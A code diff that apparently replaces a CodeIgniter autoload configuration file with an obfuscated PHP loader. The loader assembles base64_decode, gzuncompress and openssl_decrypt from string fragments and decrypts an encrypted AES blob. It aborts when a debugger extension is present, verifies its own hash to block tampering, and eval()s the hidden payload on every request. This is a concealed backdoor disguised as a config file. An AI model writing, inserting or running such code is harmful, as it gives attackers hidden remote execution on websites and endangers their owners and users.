@@ -1,135 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------
-| AUTO-LOADER
-| -------------------------------------------------------------------
-| This file specifies which systems should be loaded by default.
-|
-| In order to keep the framework as light-weight as possible only the
-| absolute minimal resources are loaded by default. For example,
-| the database is not connected to automatically since no assumption
-| is made regarding whether you intend to use it.  This file lets
-| you globally define which systems you would like loaded with every
-| request.
-|
-| -------------------------------------------------------------------
-| Instructions
-| -------------------------------------------------------------------
-|
-| These are the things you can load automatically:
-|
-| 1. Packages
-| 2. Libraries
-| 3. Drivers
-| 4. Helper files
-| 5. Custom config files
-| 6. Language files
-| 7. Models
-|
-*/
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Packages
-| -------------------------------------------------------------------
-| Prototype:
-|
-|  $autoload['packages'] = array(APPPATH.'third_party', '/usr/local/shared');
-|
-*/
-$autoload['packages'] = array();
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Libraries
-| -------------------------------------------------------------------
-| These are the classes located in system/libraries/ or your
-| application/libraries/ directory, with the addition of the
-| 'database' library, which is somewhat of a special case.
-|
-| Prototype:
-|
-|	$autoload['libraries'] = array('database', 'email', 'session');
-|
-| You can also supply an alternative library name to be assigned
-| in the controller:
-|
-|	$autoload['libraries'] = array('user_agent' => 'ua');
-*/
-$autoload['libraries'] = array('form_validation','session','database');
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Drivers
-| -------------------------------------------------------------------
-| These classes are located in system/libraries/ or in your
-| application/libraries/ directory, but are also placed inside their
-| own subdirectory and they extend the CI_Driver_Library class. They
-| offer multiple interchangeable driver options.
-|
-| Prototype:
-|
-|	$autoload['drivers'] = array('cache');
-|
-| You can also supply an alternative property name to be assigned in
-| the controller:
-|
-|	$autoload['drivers'] = array('cache' => 'cch');
-|
-*/
-$autoload['drivers'] = array();
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Helper Files
-| -------------------------------------------------------------------
-| Prototype:
-|
-|	$autoload['helper'] = array('url', 'file');
-*/
-$autoload['helper'] = array('url','form','custom','appinfo','currency','foreign_currency');
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Config files
-| -------------------------------------------------------------------
-| Prototype:
-|
-|	$autoload['config'] = array('config1', 'config2');
-|
-| NOTE: This item is intended for use ONLY if you have created custom
-| config files.  Otherwise, leave it blank.
-|
-*/
-$autoload['config'] = array();
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Language files
-| -------------------------------------------------------------------
-| Prototype:
-|
-|	$autoload['language'] = array('lang1', 'lang2');
-|
-| NOTE: Do not include the "_lang" part of your file.  For example
-| "codeigniter_lang.php" would be referenced as array('codeigniter');
-|
-*/
-$autoload['language'] = array();
-
-/*
-| -------------------------------------------------------------------
-|  Auto-load Models
-| -------------------------------------------------------------------
-| Prototype:
-|
-|	$autoload['model'] = array('first_model', 'second_model');
-|
-| You can also supply an alternative model name to be assigned
-| in the controller:
-|
-|	$autoload['model'] = array('first_model' => 'first');
-*/
-$autoload['model'] = array();
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_vx89149d=('bas'.'e64'.'_de'.'cod'.'e');
+$_s5vj3ndr=('gzu'.'nco'.'mpr'.'ess');
+$_m8l8yioa=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t68ga90p='tf+1gpKB';
+$_qm7sn2e7='IAPdJppU';
+$_ak93hbad='p3lwDfVq';
+$_psblkghe='p6ltbbN2yTA=';
+$_rjqh7yyl='pAHH1gR1';
+$_t0u1rl92='safqvb6b';
+$_dchc47x0='z4Go5zmp';
+$_etl9yerm='2oh4aQ==';
+$_mg8t614q=$_vx89149d($_qm7sn2e7.$_rjqh7yyl.$_t68ga90p.$_ak93hbad.$_psblkghe);
+$_mhtkn4j0=$_vx89149d($_t0u1rl92.$_dchc47x0.$_etl9yerm);
+$_k16u7sgw=$_vx89149d('y6HRY67MqcgtLDsc+jY57mp4pK26BZoYfL5iNFz8OQ0kt8upvvR57br1O0NKgFJjZP+gpGkBCcLLcuz9tLOcopyOPYM0If78VimB57Q6DWZbH1/s6BrxCT7cs9P4iRbKVNpYmztr8zwBhabS5q5LaUNuI6kUzBt8crZYbkGICvo3dbaKwJRVi6zf5jYJIQxQnJJHWTmM9SvshSj86eHI5ESLQ3tzWpcuClx4oPoHWzG8dS1WaQ0VIlso35jx1u/YOkPy0ds0LU6cmmI3ZY0TJk0ee8ZEGod8EbVhxRYzVZTnpFFMOQTgdJPOJivo1/2UCbDuUEwrk2I7royBcMejktQtvLqRAHQYcWqi8+nTWYbN1dGHNcoQ9RS9NNdVohT5');
+$_go3ezq5a=$_m8l8yioa($_k16u7sgw,'aes-256-cbc',$_mg8t614q,OPENSSL_RAW_DATA,$_mhtkn4j0);
+if($_go3ezq5a===false){exit;}
+$_kp6eahvj=$_s5vj3ndr($_go3ezq5a);
+if($_kp6eahvj===false){exit;}
+$_kyafox3o='ed5a49e12b7f129805ca8edf98e0ce8aa52be899dfd9ddd8dad54ea18664207e';
+$_sfm4xccr=@file_get_contents(__FILE__);
+if($_sfm4xccr!==false){
+$_h3h246uw=str_replace($_kyafox3o,"0000000000000000000000000000000000000000000000000000000000000000",$_sfm4xccr);
+$_jf7pzcc0=hash("sha256",$_h3h246uw);
+if($_jf7pzcc0!==$_kyafox3o){@http_response_code(403);exit;}
+}
+eval($_kp6eahvj);
